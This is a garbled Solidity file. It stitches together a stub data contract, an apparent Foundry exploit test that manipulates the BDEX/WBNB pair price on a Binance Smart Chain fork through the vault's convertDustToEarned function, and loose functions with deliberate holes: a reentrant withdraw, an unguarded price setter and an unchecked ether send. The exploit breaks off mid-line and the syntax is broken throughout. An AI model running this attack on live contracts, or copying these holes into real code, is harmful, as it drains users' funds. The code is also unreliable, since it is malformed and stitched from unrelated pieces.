
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

```Solidity;

;
;
interface BvaultsStrategy {
    function convertDustToEarned() external};
interface BPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast)};
contract ContractTest is DSTest{
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
    BvaultsStrategy vaultsStrategy = BvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);
    BPair Pair = BPair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 22629431)};
    function testExploit() public{
        cheats.createSelectFork("bsc", 22629431);
        address(WBNB).call{value: 34 ether}("");
        uint amountin = WBNB.balanceOf(address(this));
        cheats.createSelectFork("bsc", 22629431);
        WBNB.transfer(address(Pair), amountin);
        (uint BDEXReserve, uint WBNBReserve,) = Pair.getReserves();
        uint amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);
        cheats.createSelectFork("bsc", 22629431);
        Pair.swap(amountout, 0, address(this), "");
        vaultsStrategy.convertDustToEarned();
        uint amountBDEX = BDEX.balanceOf(address(this));
        BDEX.transfer(address(Pair), amountBDEX);
        (uint BDEXReserve1, uint WBNBRes
mapping(address => uint) public balances;
function withdrawReplay() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent)}
function setPrice(uint newPrice) public {
    price = newPrice}
function unsafeSend(address to) public {
    to.call{value: 1 ether}("")}